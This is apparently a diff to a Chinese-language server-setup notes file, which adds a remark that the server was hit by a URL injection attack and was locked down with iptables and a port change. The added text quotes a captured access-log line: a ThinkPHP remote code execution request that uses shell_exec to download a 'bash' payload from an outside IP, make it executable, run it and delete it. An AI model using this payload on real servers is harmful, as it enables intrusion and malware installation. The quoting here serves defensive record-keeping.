@@ -476,7 +476,12 @@ app:myblog下面的目录结构，此处删掉了一些目前还不用的目录�
 			VNCSERVERARGS[1]="-geometry 800x600"
 
 
->  服务器招受到url注入攻击最后采取封禁了对方ip,同时更换了端口
+>  服务器招受到url注入攻击最后采取封禁了所有陌生的接入ip,以及下面这个下载地址的ip,同时更换了端口
+
+	[23/Dec/2018 22:21:29] "GET /public/index.php?s=/Index/%09hink%07pp/
+	invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1]
+	[]=curl%20busybox%20wget%20http://142.93.51.155/bash;%20curl%20-O%20http://142.93.51.155/bash;
+	%20chmod%20777%20bash;%20./thinkphp;%20rm%20-rf%20bash HTTP/1.1" 404 2346
 
 	iptables -I INPUT -s X.X.X.X -j DROP
 
